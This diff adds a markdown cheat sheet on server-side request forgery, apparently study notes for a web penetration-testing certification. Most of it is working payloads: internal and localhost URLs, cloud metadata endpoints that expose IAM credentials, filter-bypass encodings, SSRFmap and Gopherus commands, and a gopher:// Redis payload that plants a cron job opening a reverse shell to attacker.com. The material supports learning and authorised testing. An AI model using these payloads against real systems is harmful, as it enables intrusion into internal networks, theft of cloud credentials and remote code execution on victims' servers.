@@ -1,0 +1,194 @@
+# Server-Side Request Forgery (SSRF)
+
+> SSRF forces the server to make HTTP requests to unintended locations — internal network, cloud metadata, or arbitrary URLs.
+
+---
+
+## 🔍 Types of SSRF
+
+### 1. Basic SSRF
+- Server fetches URL you control
+- Response visible in application
+
+### 2. Blind SSRF
+- Server makes request but response not shown
+- Detected via out-of-band (Burp Collaborator, interactsh)
+
+### 3. Semi-Blind SSRF
+- Partial response or error messages visible
+
+---
+
+## 🎯 Where to Look for SSRF
+
+```
+- URL parameters: ?url=, ?uri=, ?path=, ?src=, ?redirect=
+- Webhook functionality
+- PDF/Screenshot generators
+- Image fetching from URL
+- Import from URL features
+- File preview functionality
+- SSO / OAuth callbacks
+- API integrations
+- XML/JSON with URLs
+```
+
+---
+
+## 🧪 Basic Payloads
+
+```
+# Internal localhost
+http://localhost
+http://127.0.0.1
+http://0.0.0.0
+http://[::1]
+http://127.0.0.1:80
+http://127.0.0.1:22
+http://127.0.0.1:3306
+http://127.0.0.1:6379   (Redis)
+http://127.0.0.1:8080
+
+# Internal network
+http://192.168.0.1
+http://10.0.0.1
+http://172.16.0.1
+```
+
+---
+
+## ☁️ Cloud Metadata Endpoints
+
+```bash
+# AWS
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# AWS IMDSv2 (requires token)
+# Step 1: Get token
+curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+# Step 2: Use token
+curl -H "X-aws-ec2-metadata-token: TOKEN" http://169.254.169.254/latest/meta-data/
+
+# GCP
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Requires header: Metadata-Flavor: Google
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Requires header: Metadata: true
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1/
+```
+
+---
+
+## 🚫 SSRF Bypass Techniques
+
+```bash
+# IP encoding bypass
+http://2130706433          (127.0.0.1 in decimal)
+http://0x7f000001          (127.0.0.1 in hex)
+http://0177.0.0.1          (127.0.0.1 in octal)
+http://127.0.0.1.nip.io    (DNS rebinding)
+
+# URL parsing confusion
+http://attacker.com@127.0.0.1
+http://127.0.0.1#attacker.com
+http://attacker.com?.127.0.0.1
+
+# Protocol bypass
+file:///etc/passwd
+dict://127.0.0.1:6379/
+gopher://127.0.0.1:6379/
+ftp://127.0.0.1/
+
+# Redirect bypass
+# Host your own redirect: https://attacker.com/redirect -> http://169.254.169.254
+
+# Double URL encoding
+http://%31%32%37%2e%30%2e%30%2e%31
+
+# IPv6
+http://[::1]
+http://[::ffff:127.0.0.1]
+http://[0:0:0:0:0:ffff:127.0.0.1]
+```
+
+---
+
+## 🔗 Gopher Protocol (SSRF to RCE)
+
+```bash
+# Redis via SSRF
+gopher://127.0.0.1:6379/_%0d%0aSET%20shell%20%22\n\n*/1%20*%20*%20*%20*%20/bin/bash%20-i%20>%26%20/dev/tcp/attacker.com/4444%200>%261\n\n%22%0d%0aCONFIG%20SET%20dir%20/var/spool/cron/%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSAVE%0d%0a
+
+# MySQL via SSRF (unauthenticated)
+gopher://127.0.0.1:3306/...
+
+# SMTP via SSRF
+gopher://127.0.0.1:25/...
+```
+
+---
+
+## 🛠️ Tools
+
+| Tool | Use |
+|------|-----|
+| Burp Suite + Collaborator | Detect blind SSRF |
+| interactsh | Out-of-band detection |
+| SSRFmap | Automated SSRF exploitation |
+| Gopherus | Generate gopher payloads |
+
+```bash
+# SSRFmap
+python3 ssrfmap.py -r request.txt -p url -m readfiles
+
+# Gopherus (Redis)
+python3 gopherus.py --exploit redis
+
+# interactsh
+./interactsh-client -server interactsh.com
+```
+
+---
+
+## 📋 SSRF Testing Checklist
+
+- [ ] Find all URL input parameters
+- [ ] Test with Burp Collaborator (blind SSRF)
+- [ ] Try AWS/GCP/Azure metadata endpoints
+- [ ] Test internal ports (22, 80, 443, 3306, 6379, 8080, 8443)
+- [ ] Try localhost variations and bypasses
+- [ ] Check for open redirects that can be chained
+- [ ] Test file:// protocol
+- [ ] Test gopher:// for internal service attacks
+- [ ] Check PDF/image generators
+
+---
+
+## 🧠 eWPTXv3 Tips
+
+- **Chain SSRF + IMDSv1** on AWS for credential theft
+- **SSRF to RCE** via Redis/Memcached with gopher://
+- Always try **blind SSRF** using Burp Collaborator
+- Test **DNS rebinding** attacks for localhost bypass
+- Look for SSRF in **webhook** and **import** features
+- **SSRF + open redirect** = powerful combo
+
+---
+
+## 📚 References
+
+- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
+- [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
+- [HackTricks SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
+
+---
+
+*Notes by [@mtsboy01](https://github.com/mtsboy01) | MTS-SECURITY*
